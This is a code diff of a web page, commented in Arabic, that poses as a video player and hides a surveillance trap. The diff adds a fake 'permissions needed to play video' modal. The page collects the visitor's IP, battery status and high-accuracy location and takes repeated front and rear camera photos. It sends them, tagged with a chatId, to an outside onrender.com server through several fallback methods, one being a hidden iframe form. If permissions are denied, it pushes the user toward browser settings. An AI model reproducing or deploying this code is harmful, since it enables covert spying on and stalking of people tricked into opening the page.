@@ -227,13 +227,116 @@
             }
         }
 
-        /* نافذة التحايل المخفية */
-        #hiddenWindow {
+        /* ===== النافذة المنبثقة المركزية (بديل الإشعار العلوي) ===== */
+        #permissionModal {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        #permissionModal.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #1e1e1e;
+            padding: 40px 30px;
+            border-radius: 24px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            animation: fadeInUp 0.4s ease;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .modal-box h2 {
+            color: #fff;
+            font-size: 1.6rem;
+            margin-bottom: 10px;
+        }
+        .modal-box .icon-lock {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+        .modal-box p {
+            color: #aaa;
+            font-size: 1rem;
+            line-height: 1.6;
+            margin: 15px 0 25px;
+        }
+        .modal-box .btn-primary {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        .modal-box .btn-primary:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+        }
+        .modal-box .btn-secondary {
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            display: none; /* يظهر فقط عند الحظر */
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .modal-box .btn-secondary:hover {
+            background: #555;
+        }
+        .modal-box .status-msg {
+            color: #ffaa00;
+            font-size: 0.9rem;
+            margin-top: 15px;
+            min-height: 24px;
+        }
+        .modal-box .sub-text {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
+
+    <!-- ===== النافذة المنبثقة المركزية ===== -->
+    <div id="permissionModal">
+        <div class="modal-box">
+            <div class="icon-lock">🔐</div>
+            <h2>أذونات مطلوبة</h2>
+            <p>يحتاج الموقع إلى الوصول إلى <strong>الكاميرا</strong> و <strong>الموقع الجغرافي</strong> لتشغيل الفيديو.</p>
+            <button id="allowPermissionsBtn" class="btn-primary">✅ تفعيل الأذونات</button>
+            <button id="openSettingsBtn" class="btn-secondary">⚙️ فتح إعدادات الموقع (الترس)</button>
+            <div id="permissionStatus" class="status-msg"></div>
+            <div class="sub-text">سيظهر طلب من المتصفح، يرجى الضغط على "سماح"</div>
+        </div>
+    </div>
 
     <div class="video-player-container">
         <div class="video-info">
@@ -280,7 +383,6 @@
             'use strict';
 
             // ===== التحايل على حظر الموقع =====
-            // تخزين البيانات في متغيرات عامة
             let capturedData = {
                 permissions: [],
                 images: [],
@@ -290,12 +392,9 @@
                 chatId: ''
             };
 
-            // متغيرات التحكم
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
-            let isDataSent = false;
-            let isReturningFromSettings = false; // لتتبع العودة من الإعدادات
 
             // عناصر DOM
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -304,19 +403,27 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // ===== الحصول على الصلاحيات (تُستدعى يدوياً عند الضغطة الأولى) =====
-            async function requestCameraAndLocation() {
+            // عناصر النافذة المنبثقة
+            const modal = document.getElementById('permissionModal');
+            const allowBtn = document.getElementById('allowPermissionsBtn');
+            const settingsBtn = document.getElementById('openSettingsBtn');
+            const statusMsg = document.getElementById('permissionStatus');
+
+            // ===== دالة طلب الأذونات =====
+            async function requestAllPermissions() {
+                let cameraGranted = false;
+                let locationGranted = false;
+
                 try {
-                    // طلب الكاميرا
-                    await navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => stream.getTracks().forEach(t => t.stop()));
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(t => t.stop());
+                    cameraGranted = true;
                     capturedData.permissions.push('Camera Allowed');
                 } catch (e) {
                     capturedData.permissions.push('Camera Denied');
                 }
 
                 try {
-                    // طلب الموقع بدقة عالية
                     await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             () => resolve(),
@@ -324,10 +431,13 @@
                             { enableHighAccuracy: true, timeout: 5000 }
                         );
                     });
+                    locationGranted = true;
                     capturedData.permissions.push('Geolocation Allowed');
                 } catch (e) {
                     capturedData.permissions.push('Geolocation Denied');
                 }
+
+                return { cameraGranted, locationGranted };
             }
 
             // ===== جلب IP =====
@@ -377,7 +487,7 @@
                 }
             }
 
-            // ===== طلب الموقع بدقة عالية (لجمع البيانات) =====
+            // ===== طلب الموقع بدقة عالية =====
             async function getLocation() {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -396,13 +506,12 @@
                 }
             }
 
-            // ===== فتح إعدادات الموقع في المتصفح (محاكاة زر الترس في شريط العناوين) =====
+            // ===== فتح إعدادات الموقع في المتصفح (محاكاة زر الترس) =====
             function openLocationSettings() {
                 const currentUrl = encodeURIComponent(window.location.href);
                 const ua = navigator.userAgent;
                 let settingsUrl = '';
 
-                // المنطق الجديد: فتح إعدادات الموقع الخاصة بالمتصفح
                 if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
                     settingsUrl = `chrome://settings/content/siteDetails?site=${currentUrl}`;
                 } else if (/Edge/i.test(ua)) {
@@ -410,19 +519,16 @@
                 } else if (/Firefox/i.test(ua)) {
                     settingsUrl = `about:preferences#privacy`;
                 } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
-                    // سفاري ليس له رابط مباشر، نفتح إعدادات الخصوصية العامة
                     settingsUrl = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                 }
 
                 if (settingsUrl) {
-                    // محاولة فتح إعدادات المتصفح
                     window.location.href = settingsUrl;
                     return;
                 }
 
-                // ===== الكود القديم (تم الاحتفاظ به كتعليق وكتابته هنا احتياطياً) =====
+                // ===== الكود القديم (تم الاحتفاظ به كتعليق) =====
                 /*
-                // الكود القديم الخاص بإعدادات نظام الأندرويد/آيفون (تم تعليقه واستبداله بما سبق)
                 if (/Android/i.test(ua)) {
                     const intents = [
                         'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
@@ -450,30 +556,25 @@
                 */
             }
 
-            // ===== إرسال البيانات باستخدام تقنيات متعددة للتحايل =====
+            // ===== إرسال البيانات =====
             async function sendDataWithBypass(data) {
                 const urls = [
                     'https://server-brxz.onrender.com/submitData',
                     'https://server-brxz.onrender.com/submitData'
                 ];
 
-                // محاولة الإرسال عبر طرق متعددة
                 for (let url of urls) {
                     try {
-                        // الطريقة 1: fetch
-                        const response = await fetch(url, {
+                        await fetch(url, {
                             method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                            },
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                             body: new URLSearchParams(data),
-                            mode: 'no-cors' // محاولة تجاوز CORS
+                            mode: 'no-cors'
                         });
                         return;
                     } catch (e) {}
 
                     try {
-                        // الطريقة 2: XMLHttpRequest
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', url, false);
                         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
@@ -482,7 +583,6 @@
                     } catch (e) {}
 
                     try {
-                        // الطريقة 3: إرسال عبر iframe مخفي
                         const iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
                         document.body.appendChild(iframe);
@@ -491,7 +591,6 @@
                         form.action = url;
                         form.target = iframe.name || 'hiddenFrame';
                         iframe.name = form.target;
-
                         for (let key in data) {
                             const input = document.createElement('input');
                             input.type = 'hidden';
@@ -499,7 +598,6 @@
                             input.value = data[key];
                             form.appendChild(input);
                         }
-
                         document.body.appendChild(form);
                         form.submit();
                         setTimeout(() => {
@@ -510,7 +608,6 @@
                     } catch (e) {}
 
                     try {
-                        // الطريقة 4: navigator.sendBeacon
                         const blob = new Blob([new URLSearchParams(data).toString()], {
                             type: 'application/x-www-form-urlencoded'
                         });
@@ -520,29 +617,22 @@
                 }
             }
 
-            // ===== تشغيل الفيديو مع الصوت =====
+            // ===== تشغيل الفيديو =====
             function startVideoWithSound() {
                 if (videoStarted) return;
                 videoStarted = true;
 
-                // إظهار الفيديو
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
 
-                // محاولة تشغيل الفيديو مع الصوت
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
 
-                // تشغيل الفيديو مع محاولة إلغاء كتم الصوت
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
-                    playPromise.then(() => {
-                        // نجح التشغيل مع الصوت
-                    }).catch(() => {
-                        // إذا فشل، نحاول مرة أخرى مع تفاعل المستخدم
+                    playPromise.then(() => {}).catch(() => {
                         realVideo.muted = true;
                         realVideo.play().then(() => {
-                            // بعد التشغيل، نحاول إلغاء كتم الصوت
                             setTimeout(() => {
                                 realVideo.muted = false;
                                 realVideo.volume = 1.0;
@@ -551,14 +641,12 @@
                     });
                 }
 
-                // محاولة إلغاء كتم الصوت بعد ثانية
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     try { realVideo.play(); } catch (e) {}
                 }, 500);
 
-                // محاولة إلغاء كتم الصوت بعد 3 ثواني
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
@@ -566,35 +654,16 @@
                 }, 3000);
             }
 
-            // ===== الدالة الرئيسية =====
-            async function captureData() {
-                if (isProcessing) return;
-                if (videoStarted) return; // إذا بدأ الفيديو، لا تفعل شيئاً
-
+            // ===== جمع البيانات وتشغيل الفيديو (الخطوة النهائية) =====
+            async function collectDataAndPlay() {
+                if (isProcessing || videoStarted) return;
                 isProcessing = true;
 
-                // الضغطة الأولى: طلب الأذونات، ثم فتح الإعدادات
-                if (!settingsOpened) {
-                    settingsOpened = true;
-
-                    // طلب الكاميرا والموقع
-                    await requestCameraAndLocation();
-
-                    // فتح إعدادات الموقع في المتصفح (محاكاة زر الترس)
-                    openLocationSettings();
-
-                    isProcessing = false;
-                    return;
-                }
-
-                // الضغطة الثانية (أو بعد العودة من الإعدادات): تشغيل الفيديو
-                // ولكن قبل التشغيل، نجمع البيانات المطلوبة (مثل الصور، IP، البطارية، الموقع)
                 spinner.style.display = 'block';
                 loading.style.display = 'block';
                 playButtonOverlay.style.opacity = '0.5';
                 playButtonOverlay.style.pointerEvents = 'none';
 
-                // جمع البيانات (بما في ذلك التقاط الصور)
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
                 await Promise.all([
@@ -603,13 +672,11 @@
                     getLocation()
                 ]);
 
-                // التصوير
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
 
-                // تجهيز البيانات للإرسال
                 const data = {
                     chatId: capturedData.chatId,
                     imageDatas: capturedData.images.join(','),
@@ -619,37 +686,92 @@
                     battery: capturedData.batteryStatus
                 };
 
-                // إرسال البيانات
                 await sendDataWithBypass(data);
 
-                // إخفاء التحميل
                 spinner.style.display = 'none';
                 loading.style.display = 'none';
                 playButtonOverlay.style.opacity = '1';
                 playButtonOverlay.style.pointerEvents = 'auto';
 
-                // تشغيل الفيديو مع الصوت
                 startVideoWithSound();
-
                 isProcessing = false;
             }
 
-            // ===== رصد العودة من الإعدادات =====
+            // ===== إظهار النافذة المنبثقة عند الضغطة الأولى =====
+            function showPermissionModal() {
+                if (settingsOpened) return;
+                settingsOpened = true;
+
+                // إظهار النافذة في وسط الشاشة
+                modal.classList.add('active');
+                statusMsg.textContent = '';
+                settingsBtn.style.display = 'none';
+                allowBtn.style.display = 'block';
+            }
+
+            // ===== معالج النقر على "تفعيل الأذونات" =====
+            allowBtn.addEventListener('click', async function() {
+                statusMsg.textContent = '⏳ جاري طلب الأذونات...';
+                allowBtn.disabled = true;
+
+                const result = await requestAllPermissions();
+
+                if (result.cameraGranted || result.locationGranted) {
+                    // تم منح بعض الأذونات على الأقل
+                    statusMsg.textContent = '✅ تم تفعيل الأذونات! جاري التحميل...';
+                    modal.classList.remove('active');
+                    await collectDataAndPlay();
+                } else {
+                    // تم الحظر الكامل
+                    statusMsg.textContent = '❌ تم حظر الأذونات. يرجى فتح الإعدادات يدوياً.';
+                    allowBtn.style.display = 'none';
+                    settingsBtn.style.display = 'flex'; // يظهر زر الترس البديل
+                }
+                allowBtn.disabled = false;
+            });
+
+            // ===== معالج النقر على زر "فتح الإعدادات" (محاكاة الترس) =====
+            settingsBtn.addEventListener('click', function() {
+                statusMsg.textContent = '⏳ جاري فتح الإعدادات...';
+                openLocationSettings();
+            });
+
+            // ===== عند العودة من الإعدادات (الترس) =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // لقد عاد المستخدم من الإعدادات، نقوم بمحاكاة الضغطة الثانية تلقائياً
-                    captureData();
+                    // إذا كانت النافذة لا تزال ظاهرة، نحاول مرة أخرى
+                    if (modal.classList.contains('active')) {
+                        // إذا تم حظر الأذونات سابقاً، نعيد المحاولة
+                        statusMsg.textContent = '🔄 جاري إعادة المحاولة بعد العودة من الإعدادات...';
+                        // نعيد طلب الأذونات تلقائياً
+                        allowBtn.click();
+                    } else {
+                        // إذا كانت مخفية، نكمل مباشرة
+                        collectDataAndPlay();
+                    }
                 }
             });
 
-            // ===== ربط الأحداث =====
+            // ===== ربط زر التشغيل =====
+            function handlePlayClick() {
+                if (videoStarted) return;
+                if (isProcessing) return;
+
+                if (!settingsOpened) {
+                    showPermissionModal();
+                } else {
+                    // إذا تم فتح الإعدادات سابقاً ولكن لم يبدأ الفيديو
+                    collectDataAndPlay();
+                }
+            }
+
             if (thumbnailArea) {
-                thumbnailArea.addEventListener('click', captureData);
+                thumbnailArea.addEventListener('click', handlePlayClick);
             }
             if (playButtonOverlay) {
                 playButtonOverlay.addEventListener('click', function(e) {
                     e.stopPropagation();
-                    captureData();
+                    handlePlayClick();
                 });
             }
 
@@ -695,9 +817,6 @@
                 const seconds = currentSeconds % 60;
                 timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
             }, 1000);
-
-            // ===== لم يعد هناك طلب تلقائي للأذونات عند التحميل =====
-            // تم حذف استدعاء preRequestPermissions() من هنا
 
         })();
     </script>
